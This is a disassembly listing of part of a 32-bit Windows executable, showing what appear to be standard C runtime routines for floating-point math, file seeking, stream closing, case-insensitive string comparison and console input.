  408c12:	75 be                	jne    0x408bd2
  408c14:	dd d8                	fstp   %st(0)
  408c16:	db 2d fa fe 40 00    	fldt   0x40fefa
  408c1c:	b8 02 00 00 00       	mov    $0x2,%eax
  408c21:	83 3d 88 42 41 00 00 	cmpl   $0x0,0x414288
  408c28:	0f 85 b0 0a 00 00    	jne    0x4096de
  408c2e:	8d 0d 90 fd 40 00    	lea    0x40fd90,%ecx
  408c34:	ba 1b 00 00 00       	mov    $0x1b,%edx
  408c39:	e8 a9 0b 00 00       	call   0x4097e7
  408c3e:	5a                   	pop    %edx
  408c3f:	c3                   	ret
  408c40:	83 3d a4 42 41 00 00 	cmpl   $0x0,0x4142a4
  408c47:	0f 84 ee 0d 00 00    	je     0x409a3b
  408c4d:	83 ec 08             	sub    $0x8,%esp
  408c50:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  408c55:	8b 44 24 04          	mov    0x4(%esp),%eax
  408c59:	25 80 7f 00 00       	and    $0x7f80,%eax
  408c5e:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  408c63:	75 0f                	jne    0x408c74
  408c65:	d9 3c 24             	fnstcw (%esp)
  408c68:	66 8b 04 24          	mov    (%esp),%ax
  408c6c:	66 83 e0 7f          	and    $0x7f,%ax
  408c70:	66 83 f8 7f          	cmp    $0x7f,%ax
  408c74:	8d 64 24 08          	lea    0x8(%esp),%esp
  408c78:	0f 85 bd 0d 00 00    	jne    0x409a3b
  408c7e:	eb 00                	jmp    0x408c80
  408c80:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  408c86:	66 0f 28 15 b0 fd 40 	movapd 0x40fdb0,%xmm2
  408c8d:	00 
  408c8e:	66 0f 28 c8          	movapd %xmm0,%xmm1
  408c92:	66 0f 28 f8          	movapd %xmm0,%xmm7
  408c96:	66 0f 73 d0 34       	psrlq  $0x34,%xmm0
  408c9b:	66 0f 7e c0          	movd   %xmm0,%eax
  408c9f:	66 0f 54 05 d0 fd 40 	andpd  0x40fdd0,%xmm0
  408ca6:	00 
  408ca7:	66 0f fa d0          	psubd  %xmm0,%xmm2
  408cab:	66 0f d3 ca          	psrlq  %xmm2,%xmm1
  408caf:	a9 00 08 00 00       	test   $0x800,%eax
  408cb4:	74 4c                	je     0x408d02
  408cb6:	3d ff 0b 00 00       	cmp    $0xbff,%eax
  408cbb:	7c 7d                	jl     0x408d3a
  408cbd:	66 0f f3 ca          	psllq  %xmm2,%xmm1
  408cc1:	3d 32 0c 00 00       	cmp    $0xc32,%eax
  408cc6:	7f 0b                	jg     0x408cd3
  408cc8:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
  408cce:	dd 44 24 04          	fldl   0x4(%esp)
  408cd2:	c3                   	ret
  408cd3:	66 0f 2e ff          	ucomisd %xmm7,%xmm7
  408cd7:	7b 24                	jnp    0x408cfd
  408cd9:	ba ec 03 00 00       	mov    $0x3ec,%edx
  408cde:	83 ec 10             	sub    $0x10,%esp
  408ce1:	89 54 24 0c          	mov    %edx,0xc(%esp)
  408ce5:	8b d4                	mov    %esp,%edx
  408ce7:	83 c2 14             	add    $0x14,%edx
  408cea:	89 54 24 08          	mov    %edx,0x8(%esp)
  408cee:	89 54 24 04          	mov    %edx,0x4(%esp)
  408cf2:	89 14 24             	mov    %edx,(%esp)
  408cf5:	e8 29 0b 00 00       	call   0x409823
  408cfa:	83 c4 10             	add    $0x10,%esp
  408cfd:	dd 44 24 04          	fldl   0x4(%esp)
  408d01:	c3                   	ret
  408d02:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
  408d08:	66 0f f3 ca          	psllq  %xmm2,%xmm1
  408d0c:	66 0f 28 d8          	movapd %xmm0,%xmm3
  408d10:	66 0f c2 c1 06       	cmpnlepd %xmm1,%xmm0
  408d15:	3d ff 03 00 00       	cmp    $0x3ff,%eax
  408d1a:	7c 25                	jl     0x408d41
  408d1c:	3d 32 04 00 00       	cmp    $0x432,%eax
  408d21:	7f b0                	jg     0x408cd3
  408d23:	66 0f 54 05 a0 fd 40 	andpd  0x40fda0,%xmm0
  408d2a:	00 
  408d2b:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
  408d2f:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
  408d35:	dd 44 24 04          	fldl   0x4(%esp)
  408d39:	c3                   	ret
  408d3a:	dd 05 e0 fd 40 00    	fldl   0x40fde0
  408d40:	c3                   	ret
  408d41:	66 0f c2 1d c0 fd 40 	cmpnlepd 0x40fdc0,%xmm3
  408d48:	00 06 
  408d4a:	66 0f 54 1d a0 fd 40 	andpd  0x40fda0,%xmm3
  408d51:	00 
  408d52:	66 0f d6 5c 24 04    	movq   %xmm3,0x4(%esp)
  408d58:	dd 44 24 04          	fldl   0x4(%esp)
  408d5c:	c3                   	ret
  408d5d:	8b ff                	mov    %edi,%edi
  408d5f:	55                   	push   %ebp
  408d60:	8b ec                	mov    %esp,%ebp
  408d62:	51                   	push   %ecx
  408d63:	51                   	push   %ecx
  408d64:	56                   	push   %esi
  408d65:	8b 75 08             	mov    0x8(%ebp),%esi
  408d68:	57                   	push   %edi
  408d69:	56                   	push   %esi
  408d6a:	e8 09 d0 ff ff       	call   0x405d78
  408d6f:	83 cf ff             	or     $0xffffffff,%edi
  408d72:	59                   	pop    %ecx
  408d73:	3b c7                	cmp    %edi,%eax
  408d75:	75 11                	jne    0x408d88
  408d77:	e8 bf ba ff ff       	call   0x40483b
  408d7c:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  408d82:	8b c7                	mov    %edi,%eax
  408d84:	8b d7                	mov    %edi,%edx
  408d86:	eb 4d                	jmp    0x408dd5
  408d88:	ff 75 14             	push   0x14(%ebp)
  408d8b:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  408d8e:	51                   	push   %ecx
  408d8f:	ff 75 10             	push   0x10(%ebp)
  408d92:	ff 75 0c             	push   0xc(%ebp)
  408d95:	50                   	push   %eax
  408d96:	ff 15 70 c0 40 00    	call   *0x40c070
  408d9c:	85 c0                	test   %eax,%eax
  408d9e:	75 0f                	jne    0x408daf
  408da0:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  408da6:	50                   	push   %eax
  408da7:	e8 59 ba ff ff       	call   0x404805
  408dac:	59                   	pop    %ecx
  408dad:	eb d3                	jmp    0x408d82
  408daf:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408db2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408db5:	23 c2                	and    %edx,%eax
  408db7:	3b c7                	cmp    %edi,%eax
  408db9:	74 c7                	je     0x408d82
  408dbb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408dbe:	8b ce                	mov    %esi,%ecx
  408dc0:	83 e6 3f             	and    $0x3f,%esi
  408dc3:	c1 f9 06             	sar    $0x6,%ecx
  408dc6:	6b f6 30             	imul   $0x30,%esi,%esi
  408dc9:	8b 0c 8d 50 40 41 00 	mov    0x414050(,%ecx,4),%ecx
  408dd0:	80 64 31 28 fd       	andb   $0xfd,0x28(%ecx,%esi,1)
  408dd5:	5f                   	pop    %edi
  408dd6:	5e                   	pop    %esi
  408dd7:	8b e5                	mov    %ebp,%esp
  408dd9:	5d                   	pop    %ebp
  408dda:	c3                   	ret
  408ddb:	8b ff                	mov    %edi,%edi
  408ddd:	55                   	push   %ebp
  408dde:	8b ec                	mov    %esp,%ebp
  408de0:	ff 75 14             	push   0x14(%ebp)
  408de3:	ff 75 10             	push   0x10(%ebp)
  408de6:	ff 75 0c             	push   0xc(%ebp)
  408de9:	ff 75 08             	push   0x8(%ebp)
  408dec:	e8 6c ff ff ff       	call   0x408d5d
  408df1:	83 c4 10             	add    $0x10,%esp
  408df4:	5d                   	pop    %ebp
  408df5:	c3                   	ret
  408df6:	8b ff                	mov    %edi,%edi
  408df8:	55                   	push   %ebp
  408df9:	8b ec                	mov    %esp,%ebp
  408dfb:	56                   	push   %esi
  408dfc:	8b 75 08             	mov    0x8(%ebp),%esi
  408dff:	85 f6                	test   %esi,%esi
  408e01:	75 15                	jne    0x408e18
  408e03:	e8 33 ba ff ff       	call   0x40483b
  408e08:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408e0e:	e8 30 b8 ff ff       	call   0x404643
  408e13:	83 c8 ff             	or     $0xffffffff,%eax
  408e16:	eb 51                	jmp    0x408e69
  408e18:	8b 46 0c             	mov    0xc(%esi),%eax
  408e1b:	57                   	push   %edi
  408e1c:	83 cf ff             	or     $0xffffffff,%edi
  408e1f:	c1 e8 0d             	shr    $0xd,%eax
  408e22:	a8 01                	test   $0x1,%al
  408e24:	74 39                	je     0x408e5f
  408e26:	56                   	push   %esi
  408e27:	e8 25 ef ff ff       	call   0x407d51
  408e2c:	56                   	push   %esi
  408e2d:	8b f8                	mov    %eax,%edi
  408e2f:	e8 a6 f2 ff ff       	call   0x4080da
  408e34:	56                   	push   %esi
  408e35:	e8 97 e4 ff ff       	call   0x4072d1
  408e3a:	50                   	push   %eax
  408e3b:	e8 5e 0d 00 00       	call   0x409b9e
  408e40:	83 c4 10             	add    $0x10,%esp
  408e43:	85 c0                	test   %eax,%eax
  408e45:	79 05                	jns    0x408e4c
  408e47:	83 cf ff             	or     $0xffffffff,%edi
  408e4a:	eb 13                	jmp    0x408e5f
  408e4c:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  408e50:	74 0d                	je     0x408e5f
  408e52:	ff 76 1c             	push   0x1c(%esi)
  408e55:	e8 b3 af ff ff       	call   0x403e0d
  408e5a:	83 66 1c 00          	andl   $0x0,0x1c(%esi)
  408e5e:	59                   	pop    %ecx
  408e5f:	56                   	push   %esi
  408e60:	e8 54 0e 00 00       	call   0x409cb9
  408e65:	59                   	pop    %ecx
  408e66:	8b c7                	mov    %edi,%eax
  408e68:	5f                   	pop    %edi
  408e69:	5e                   	pop    %esi
  408e6a:	5d                   	pop    %ebp
  408e6b:	c3                   	ret
  408e6c:	6a 10                	push   $0x10
  408e6e:	68 f0 19 41 00       	push   $0x4119f0
  408e73:	e8 98 92 ff ff       	call   0x402110
  408e78:	8b 75 08             	mov    0x8(%ebp),%esi
  408e7b:	89 75 e0             	mov    %esi,-0x20(%ebp)
  408e7e:	33 c0                	xor    %eax,%eax
  408e80:	85 f6                	test   %esi,%esi
  408e82:	0f 95 c0             	setne  %al
  408e85:	85 c0                	test   %eax,%eax
  408e87:	75 15                	jne    0x408e9e
  408e89:	e8 ad b9 ff ff       	call   0x40483b
  408e8e:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408e94:	e8 aa b7 ff ff       	call   0x404643
  408e99:	83 c8 ff             	or     $0xffffffff,%eax
  408e9c:	eb 3b                	jmp    0x408ed9
  408e9e:	8b 46 0c             	mov    0xc(%esi),%eax
  408ea1:	c1 e8 0c             	shr    $0xc,%eax
  408ea4:	56                   	push   %esi
  408ea5:	a8 01                	test   $0x1,%al
  408ea7:	74 08                	je     0x408eb1
  408ea9:	e8 0b 0e 00 00       	call   0x409cb9
  408eae:	59                   	pop    %ecx
  408eaf:	eb e8                	jmp    0x408e99
  408eb1:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  408eb5:	e8 51 e5 ff ff       	call   0x40740b
  408eba:	59                   	pop    %ecx
  408ebb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408ebf:	56                   	push   %esi
  408ec0:	e8 31 ff ff ff       	call   0x408df6
  408ec5:	59                   	pop    %ecx
  408ec6:	8b f0                	mov    %eax,%esi
  408ec8:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  408ecb:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  408ed2:	e8 0b 00 00 00       	call   0x408ee2
  408ed7:	8b c6                	mov    %esi,%eax
  408ed9:	e8 78 92 ff ff       	call   0x402156
  408ede:	c3                   	ret
  408edf:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  408ee2:	ff 75 e0             	push   -0x20(%ebp)
  408ee5:	e8 35 e5 ff ff       	call   0x40741f
  408eea:	59                   	pop    %ecx
  408eeb:	c3                   	ret
  408eec:	cc                   	int3
  408eed:	cc                   	int3
  408eee:	cc                   	int3
  408eef:	cc                   	int3
  408ef0:	55                   	push   %ebp
  408ef1:	8b ec                	mov    %esp,%ebp
  408ef3:	57                   	push   %edi
  408ef4:	56                   	push   %esi
  408ef5:	53                   	push   %ebx
  408ef6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408ef9:	0b c9                	or     %ecx,%ecx
  408efb:	74 4d                	je     0x408f4a
  408efd:	8b 75 08             	mov    0x8(%ebp),%esi
  408f00:	8b 7d 0c             	mov    0xc(%ebp),%edi
  408f03:	b7 41                	mov    $0x41,%bh
  408f05:	b3 5a                	mov    $0x5a,%bl
  408f07:	b6 20                	mov    $0x20,%dh
  408f09:	8d 49 00             	lea    0x0(%ecx),%ecx
  408f0c:	8a 26                	mov    (%esi),%ah
  408f0e:	0a e4                	or     %ah,%ah
  408f10:	8a 07                	mov    (%edi),%al
  408f12:	74 27                	je     0x408f3b
  408f14:	0a c0                	or     %al,%al
  408f16:	74 23                	je     0x408f3b
  408f18:	83 c6 01             	add    $0x1,%esi
  408f1b:	83 c7 01             	add    $0x1,%edi
  408f1e:	3a e7                	cmp    %bh,%ah
  408f20:	72 06                	jb     0x408f28
  408f22:	3a e3                	cmp    %bl,%ah
  408f24:	77 02                	ja     0x408f28
  408f26:	02 e6                	add    %dh,%ah
  408f28:	3a c7                	cmp    %bh,%al
  408f2a:	72 06                	jb     0x408f32
  408f2c:	3a c3                	cmp    %bl,%al
  408f2e:	77 02                	ja     0x408f32
  408f30:	02 c6                	add    %dh,%al
  408f32:	3a e0                	cmp    %al,%ah
  408f34:	75 0b                	jne    0x408f41
  408f36:	83 e9 01             	sub    $0x1,%ecx
  408f39:	75 d1                	jne    0x408f0c
  408f3b:	33 c9                	xor    %ecx,%ecx
  408f3d:	3a e0                	cmp    %al,%ah
  408f3f:	74 09                	je     0x408f4a
  408f41:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  408f46:	72 02                	jb     0x408f4a
  408f48:	f7 d9                	neg    %ecx
  408f4a:	8b c1                	mov    %ecx,%eax
  408f4c:	5b                   	pop    %ebx
  408f4d:	5e                   	pop    %esi
  408f4e:	5f                   	pop    %edi
  408f4f:	c9                   	leave
  408f50:	c3                   	ret
  408f51:	8b ff                	mov    %edi,%edi
  408f53:	55                   	push   %ebp
  408f54:	8b ec                	mov    %esp,%ebp
  408f56:	51                   	push   %ecx
  408f57:	a1 60 37 41 00       	mov    0x413760,%eax
  408f5c:	83 f8 fe             	cmp    $0xfffffffe,%eax
  408f5f:	75 0a                	jne    0x408f6b
  408f61:	e8 8e 0d 00 00       	call   0x409cf4
  408f66:	a1 60 37 41 00       	mov    0x413760,%eax
  408f6b:	83 f8 ff             	cmp    $0xffffffff,%eax
  408f6e:	75 07                	jne    0x408f77
  408f70:	b8 ff ff 00 00       	mov    $0xffff,%eax
  408f75:	eb 1b                	jmp    0x408f92
  408f77:	6a 00                	push   $0x0
  408f79:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  408f7c:	51                   	push   %ecx
  408f7d:	6a 01                	push   $0x1
  408f7f:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408f82:	51                   	push   %ecx
  408f83:	50                   	push   %eax
  408f84:	ff 15 6c c0 40 00    	call   *0x40c06c
  408f8a:	85 c0                	test   %eax,%eax
  408f8c:	74 e2                	je     0x408f70
  408f8e:	66 8b 45 08          	mov    0x8(%ebp),%ax
  408f92:	8b e5                	mov    %ebp,%esp
  408f94:	5d                   	pop    %ebp
  408f95:	c3                   	ret
  408f96:	6a 0a                	push   $0xa
  408f98:	e8 0f 19 00 00       	call   0x40a8ac
  408f9d:	a3 a4 42 41 00       	mov    %eax,0x4142a4
  408fa2:	33 c0                	xor    %eax,%eax
  408fa4:	c3                   	ret
  408fa5:	cc                   	int3
  408fa6:	cc                   	int3
  408fa7:	cc                   	int3
  408fa8:	cc                   	int3
  408fa9:	cc                   	int3
  408faa:	cc                   	int3
  408fab:	cc                   	int3
  408fac:	cc                   	int3
  408fad:	cc                   	int3
  408fae:	cc                   	int3
  408faf:	cc                   	int3
  408fb0:	55                   	push   %ebp
  408fb1:	8b ec                	mov    %esp,%ebp
  408fb3:	83 ec 08             	sub    $0x8,%esp
  408fb6:	83 e4 f0             	and    $0xfffffff0,%esp
  408fb9:	dd 1c 24             	fstpl  (%esp)
  408fbc:	f3 0f 7e 04 24       	movq   (%esp),%xmm0
  408fc1:	e8 08 00 00 00       	call   0x408fce
  408fc6:	c9                   	leave
  408fc7:	c3                   	ret
  408fc8:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  408fce:	ba 00 00 00 00       	mov    $0x0,%edx
  408fd3:	66 0f 28 e8          	movapd %xmm0,%xmm5
  408fd7:	66 0f 14 c0          	unpcklpd %xmm0,%xmm0
  408fdb:	66 0f 73 d5 34       	psrlq  $0x34,%xmm5
  408fe0:	66 0f c5 cd 00       	pextrw $0x0,%xmm5,%ecx
  408fe5:	66 0f 28 0d f0 fd 40 	movapd 0x40fdf0,%xmm1
  408fec:	00 
  408fed:	66 0f 28 15 00 fe 40 	movapd 0x40fe00,%xmm2
  408ff4:	00 
  408ff5:	66 0f 28 1d 60 fe 40 	movapd 0x40fe60,%xmm3
  408ffc:	00 
  408ffd:	66 0f 28 25 10 fe 40 	movapd 0x40fe10,%xmm4
  409004:	00 
  409005:	66 0f 28 35 20 fe 40 	movapd 0x40fe20,%xmm6
  40900c:	00 
  40900d:	66 0f 54 c1          	andpd  %xmm1,%xmm0
  409011:	66 0f 56 c3          	orpd   %xmm3,%xmm0
  409015:	66 0f 58 e0          	addpd  %xmm0,%xmm4
  409019:	66 0f c5 c4 00       	pextrw $0x0,%xmm4,%eax
  40901e:	25 f0 07 00 00       	and    $0x7f0,%eax
  409023:	66 0f 28 a0 30 04 41 	movapd 0x410430(%eax),%xmm4
  40902a:	00 
  40902b:	66 0f 28 b8 20 00 41 	movapd 0x410020(%eax),%xmm7
  409032:	00 
  409033:	66 0f 54 f0          	andpd  %xmm0,%xmm6
  409037:	66 0f 5c c6          	subpd  %xmm6,%xmm0
  40903b:	66 0f 59 f4          	mulpd  %xmm4,%xmm6
  40903f:	66 0f 5c f2          	subpd  %xmm2,%xmm6
  409043:	f2 0f 58 fe          	addsd  %xmm6,%xmm7
  409047:	66 0f 59 c4          	mulpd  %xmm4,%xmm0
  40904b:	66 0f 28 e0          	movapd %xmm0,%xmm4
  40904f:	66 0f 58 c6          	addpd  %xmm6,%xmm0
  409053:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  409059:	83 e9 01             	sub    $0x1,%ecx
  40905c:	81 f9 fd 07 00 00    	cmp    $0x7fd,%ecx
  409062:	0f 87 be 00 00 00    	ja     0x409126
  409068:	81 e9 fe 03 00 00    	sub    $0x3fe,%ecx
  40906e:	03 ca                	add    %edx,%ecx
  409070:	f2 0f 2a f1          	cvtsi2sd %ecx,%xmm6
  409074:	66 0f 14 f6          	unpcklpd %xmm6,%xmm6
  409078:	c1 e1 0a             	shl    $0xa,%ecx
  40907b:	03 c1                	add    %ecx,%eax
  40907d:	b9 10 00 00 00       	mov    $0x10,%ecx
  409082:	ba 00 00 00 00       	mov    $0x0,%edx
  409087:	83 f8 00             	cmp    $0x0,%eax
  40908a:	0f 44 d1             	cmove  %ecx,%edx
  40908d:	66 0f 28 0d b0 fe 40 	movapd 0x40feb0,%xmm1
  409094:	00 
  409095:	66 0f 28 d8          	movapd %xmm0,%xmm3
  409099:	66 0f 28 15 c0 fe 40 	movapd 0x40fec0,%xmm2
  4090a0:	00 
  4090a1:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
  4090a5:	66 0f 59 db          	mulpd  %xmm3,%xmm3
  4090a9:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  4090ad:	66 0f 28 15 d0 fe 40 	movapd 0x40fed0,%xmm2
  4090b4:	00 
  4090b5:	f2 0f 59 db          	mulsd  %xmm3,%xmm3
  4090b9:	66 0f 28 2d 30 fe 40 	movapd 0x40fe30,%xmm5
  4090c0:	00 
  4090c1:	66 0f 59 f5          	mulpd  %xmm5,%xmm6
  4090c5:	66 0f 28 aa 40 fe 40 	movapd 0x40fe40(%edx),%xmm5
  4090cc:	00 
  4090cd:	66 0f 54 e5          	andpd  %xmm5,%xmm4
  4090d1:	66 0f 58 fe          	addpd  %xmm6,%xmm7
  4090d5:	66 0f 58 fc          	addpd  %xmm4,%xmm7
  4090d9:	66 0f 59 c8          	mulpd  %xmm0,%xmm1
  4090dd:	f2 0f 59 d8          	mulsd  %xmm0,%xmm3
  4090e1:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  4090e5:	66 0f 28 15 e0 fe 40 	movapd 0x40fee0,%xmm2
  4090ec:	00 
  4090ed:	66 0f 59 d0          	mulpd  %xmm0,%xmm2
  4090f1:	66 0f 28 f7          	movapd %xmm7,%xmm6
  4090f5:	66 0f 15 f6          	unpckhpd %xmm6,%xmm6
  4090f9:	66 0f 59 cb          	mulpd  %xmm3,%xmm1
  4090fd:	83 ec 10             	sub    $0x10,%esp
  409100:	66 0f 28 c1          	movapd %xmm1,%xmm0
  409104:	66 0f 58 ca          	addpd  %xmm2,%xmm1
  409108:	66 0f 15 c0          	unpckhpd %xmm0,%xmm0
  40910c:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  409110:	f2 0f 58 c6          	addsd  %xmm6,%xmm0
  409114:	f2 0f 58 c7          	addsd  %xmm7,%xmm0
  409118:	66 0f 13 44 24 04    	movlpd %xmm0,0x4(%esp)
  40911e:	dd 44 24 04          	fldl   0x4(%esp)
  409122:	83 c4 10             	add    $0x10,%esp
  409125:	c3                   	ret
  409126:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  40912c:	66 0f 28 0d 70 fe 40 	movapd 0x40fe70,%xmm1
  409133:	00 
  409134:	f2 0f c2 c8 00       	cmpeqsd %xmm0,%xmm1
  409139:	66 0f c5 c1 00       	pextrw $0x0,%xmm1,%eax
  40913e:	83 f8 00             	cmp    $0x0,%eax
  409141:	77 48                	ja     0x40918b
  409143:	83 f9 ff             	cmp    $0xffffffff,%ecx
  409146:	74 5e                	je     0x4091a6
  409148:	81 f9 fe 07 00 00    	cmp    $0x7fe,%ecx
  40914e:	77 6c                	ja     0x4091bc
  409150:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  409156:	66 0f 28 0d f0 fd 40 	movapd 0x40fdf0,%xmm1
  40915d:	00 
  40915e:	66 0f 28 15 60 fe 40 	movapd 0x40fe60,%xmm2
  409165:	00 
  409166:	66 0f 54 c1          	andpd  %xmm1,%xmm0
  40916a:	66 0f 56 c2          	orpd   %xmm2,%xmm0
  40916e:	f2 0f c2 d0 00       	cmpeqsd %xmm0,%xmm2
  409173:	66 0f c5 c2 00       	pextrw $0x0,%xmm2,%eax
  409178:	83 f8 00             	cmp    $0x0,%eax
  40917b:	74 07                	je     0x409184
  40917d:	dd 05 98 fe 40 00    	fldl   0x40fe98
  409183:	c3                   	ret
  409184:	ba e9 03 00 00       	mov    $0x3e9,%edx
  409189:	eb 4f                	jmp    0x4091da
  40918b:	66 0f 12 15 60 fe 40 	movlpd 0x40fe60,%xmm2
  409192:	00 
  409193:	f2 0f 5e d0          	divsd  %xmm0,%xmm2
  409197:	66 0f 12 0d 90 fe 40 	movlpd 0x40fe90,%xmm1
  40919e:	00 
  40919f:	ba 08 00 00 00       	mov    $0x8,%edx
  4091a4:	eb 34                	jmp    0x4091da
  4091a6:	66 0f 12 0d 80 fe 40 	movlpd 0x40fe80,%xmm1
  4091ad:	00 
  4091ae:	f2 0f 59 c1          	mulsd  %xmm1,%xmm0
  4091b2:	ba cc ff ff ff       	mov    $0xffffffcc,%edx
  4091b7:	e9 17 fe ff ff       	jmp    0x408fd3
  4091bc:	83 c1 01             	add    $0x1,%ecx
  4091bf:	81 e1 ff 07 00 00    	and    $0x7ff,%ecx
  4091c5:	81 f9 ff 07 00 00    	cmp    $0x7ff,%ecx
  4091cb:	73 3a                	jae    0x409207
  4091cd:	66 0f 57 c9          	xorpd  %xmm1,%xmm1
  4091d1:	f2 0f 5e c9          	divsd  %xmm1,%xmm1
  4091d5:	ba 09 00 00 00       	mov    $0x9,%edx
  4091da:	83 ec 1c             	sub    $0x1c,%esp
  4091dd:	66 0f 13 4c 24 10    	movlpd %xmm1,0x10(%esp)
  4091e3:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4091e7:	8b d4                	mov    %esp,%edx
  4091e9:	83 c2 10             	add    $0x10,%edx
  4091ec:	89 54 24 08          	mov    %edx,0x8(%esp)
  4091f0:	83 c2 10             	add    $0x10,%edx
  4091f3:	89 54 24 04          	mov    %edx,0x4(%esp)
  4091f7:	89 14 24             	mov    %edx,(%esp)
  4091fa:	e8 24 06 00 00       	call   0x409823
  4091ff:	dd 44 24 10          	fldl   0x10(%esp)
  409203:	83 c4 1c             	add    $0x1c,%esp
  409206:	c3                   	ret
  409207:	66 0f 12 54 24 04    	movlpd 0x4(%esp),%xmm2
  40920d:	66 0f 12 44 24 04    	movlpd 0x4(%esp),%xmm0
  409213:	66 0f 7e d0          	movd   %xmm2,%eax
  409217:	66 0f 73 d2 20       	psrlq  $0x20,%xmm2
  40921c:	66 0f 7e d1          	movd   %xmm2,%ecx
  409220:	81 e1 ff ff 0f 00    	and    $0xfffff,%ecx
  409226:	0b c1                	or     %ecx,%eax
  409228:	83 f8 00             	cmp    $0x0,%eax
  40922b:	74 a0                	je     0x4091cd
  40922d:	ba e9 03 00 00       	mov    $0x3e9,%edx
  409232:	eb a6                	jmp    0x4091da
  409234:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40923b:	eb 03                	jmp    0x409240
  40923d:	cc                   	int3
  40923e:	cc                   	int3
  40923f:	cc                   	int3
  409240:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
  409247:	0a ed                	or     %ch,%ch
  409249:	75 3b                	jne    0x409286
  40924b:	d9 c9                	fxch   %st(1)
  40924d:	d9 f1                	fyl2x
  40924f:	eb 0d                	jmp    0x40925e
  409251:	c6 85 70 ff ff ff fe 	movb   $0xfe,-0x90(%ebp)
  409258:	32 ed                	xor    %ch,%ch
  40925a:	d9 ea                	fldl2e
  40925c:	de c9                	fmulp  %st,%st(1)
  40925e:	e8 2b 01 00 00       	call   0x40938e
  409263:	d9 e8                	fld1
  409265:	de c1                	faddp  %st,%st(1)
  409267:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
  40926e:	74 04                	je     0x409274
  409270:	d9 e8                	fld1
  409272:	de f1                	fdivp  %st,%st(1)
  409274:	f6 c2 40             	test   $0x40,%dl
  409277:	75 02                	jne    0x40927b
  409279:	d9 fd                	fscale
  40927b:	0a ed                	or     %ch,%ch
  40927d:	74 02                	je     0x409281
  40927f:	d9 e0                	fchs
  409281:	e9 b2 02 00 00       	jmp    0x409538
  409286:	e8 46 01 00 00       	call   0x4093d1
  40928b:	0b c0                	or     %eax,%eax
  40928d:	74 14                	je     0x4092a3
  40928f:	32 ed                	xor    %ch,%ch
  409291:	83 f8 02             	cmp    $0x2,%eax
  409294:	74 02                	je     0x409298
  409296:	f6 d5                	not    %ch
  409298:	d9 c9                	fxch   %st(1)
  40929a:	d9 e1                	fabs
  40929c:	eb af                	jmp    0x40924d
  40929e:	e9 b5 02 00 00       	jmp    0x409558
  4092a3:	e9 4b 03 00 00       	jmp    0x4095f3
  4092a8:	dd d8                	fstp   %st(0)
  4092aa:	dd d8                	fstp   %st(0)
  4092ac:	db 2d f0 fe 40 00    	fldt   0x40fef0
  4092b2:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  4092b9:	c3                   	ret
  4092ba:	d9 ed                	fldln2
  4092bc:	d9 c9                	fxch   %st(1)
  4092be:	d9 e4                	ftst
  4092c0:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  4092c7:	9b                   	fwait
  4092c8:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
  4092cf:	75 d2                	jne    0x4092a3
  4092d1:	d9 f1                	fyl2x
  4092d3:	c3                   	ret
  4092d4:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  4092db:	dd d8                	fstp   %st(0)
  4092dd:	db 2d fa fe 40 00    	fldt   0x40fefa
  4092e3:	c3                   	ret
  4092e4:	0a c9                	or     %cl,%cl
  4092e6:	75 53                	jne    0x40933b
  4092e8:	c3                   	ret
  4092e9:	d9 ec                	fldlg2
  4092eb:	eb 02                	jmp    0x4092ef
  4092ed:	d9 ed                	fldln2
  4092ef:	d9 c9                	fxch   %st(1)
  4092f1:	0a c9                	or     %cl,%cl
  4092f3:	75 ae                	jne    0x4092a3
  4092f5:	d9 f1                	fyl2x
  4092f7:	c3                   	ret
  4092f8:	e9 5b 02 00 00       	jmp    0x409558
  4092fd:	e8 cf 00 00 00       	call   0x4093d1
  409302:	dd d8                	fstp   %st(0)
  409304:	dd d8                	fstp   %st(0)
  409306:	0a c9                	or     %cl,%cl
  409308:	75 0e                	jne    0x409318
  40930a:	d9 ee                	fldz
  40930c:	83 f8 01             	cmp    $0x1,%eax
  40930f:	75 06                	jne    0x409317
  409311:	0a ed                	or     %ch,%ch
  409313:	74 02                	je     0x409317
  409315:	d9 e0                	fchs
  409317:	c3                   	ret
  409318:	c6 85 70 ff ff ff 02 	movb   $0x2,-0x90(%ebp)
  40931f:	db 2d f0 fe 40 00    	fldt   0x40fef0
  409325:	83 f8 01             	cmp    $0x1,%eax
